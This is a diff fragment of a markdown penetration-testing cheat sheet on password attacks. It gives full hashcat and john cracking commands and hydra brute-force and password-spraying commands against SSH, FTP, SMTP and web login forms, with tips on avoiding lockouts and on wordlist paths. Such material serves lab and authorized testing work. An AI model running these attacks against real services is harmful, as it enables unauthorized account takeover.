+| **Username Generator** | `git clone https://github.com/therodri2/username_generator.git` <br> `python3 username_generator.py -w <full_names.txt>` | Takes a list of full names (e.g., "John Smith") and generates common username permutations (jsmith, john.smith, etc.). |
+
+#====================================================================
+# 2. OFFLINE ATTACKS (Cracking Hashes)
+#====================================================================
+# Description: Used when you have obtained password hashes and can crack them
+# on your own machine without touching the network.
+
+| Tool | Command | Description |
+| :--- | :--- | :--- |
+| **`hashcat` (Dictionary)** | `hashcat -a 0 -m <hash_mode> <hash_file> <wordlist>` | The standard for GPU-accelerated dictionary attacks. Use `-a 0` for a straight dictionary attack. <br> *Example:* `hashcat -a 0 -m 0 hash.txt rockyou.txt` |
+| **`hashcat` (Brute-Force)**| `hashcat -a 3 -m <hash_mode> <hash_file> <charset_mask>` | A pure brute-force attack. `-a 3` is mask mode. `?d`=digit, `?l`=lower, `?u`=upper. <br> *Example (4-digit PIN):* `hashcat -a 3 -m 0 hash.txt ?d?d?d?d` |
+| **`john` (Rule-Based)** | `john --wordlist=<wordlist> --rules=<RuleName> --stdout` | Mangles words from a wordlist based on a ruleset (e.g., appends numbers, changes case). Useful for creating more complex passwords. |
+| | `sudo vi /etc/john/john.conf` | Location of the `john.conf` file where you can view or create custom rules for mangling. |
+
+#====================================================================
+# 3. ONLINE ATTACKS (Against Live Services)
+#====================================================================
+# Description: Directly attacking a login prompt on a live network service.
+# Use small, targeted wordlists to avoid account lockouts.
+
+| Tool | Command | Description |
+| :--- | :--- | :--- |
+| **`hydra` (General)** | `hydra -L <user_list> -P <pass_list> <protocol>://<TARGET_IP>` | A versatile tool for brute-forcing many network services. Use `-l`/`-p` for single user/pass. |
+| **`hydra` (HTTP Form)** | `hydra -l <user> -P <pass_list> <TARGET_IP> http-post-form "<login_page>:<form_data>:F=<fail_string>"` | The syntax for attacking web login forms. `^USER^` and `^PASS^` are placeholders. Use `F=` (Failure) or `S=` (Success) to validate logins. |
+| **Password Spraying** | `hydra -L <user_list> -p <SINGLE_PASSWORD> <protocol>://<TARGET_IP>` | The modern, stealthy approach. Tries one common password against a large list of users to avoid lockouts. |
+
+# --- Specific Examples ---
+
+# SSH Brute-Force:
+hydra -L users.txt -P passwords.txt ssh://10.10.10.10
+
+# FTP Brute-Force:
+hydra -L users.txt -P passwords.txt ftp://10.10.10.10
+
+# SMTP Brute-Force:
+hydra -l user@domain.com -P passwords.txt smtp://10.10.10.10
+
+# Web Login Password Spray:
+hydra -L users.txt -p 'Spring2025!' 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
+```
+
+#### Quick Reference Wordlists
 *   **Web Logins & SSH/FTP:** `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`
     *   **Why:** Small, fast, high-probability. Avoids account lockouts
     *   **Use for:** Web login forms, SSH, FTP, and other online attacks
 
-#### Offline Hash Cracking (John, Hashcat)
-*   **Primary:** `/usr/share/wordlists/rockyou.txt`
+*   **Primary Offline:** `/usr/share/wordlists/rockyou.txt`
     *   **Note:** Decompress first with `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`
     *   **Why:** Massive and comprehensive. Perfect for offline cracking where speed isn't network-limited
 
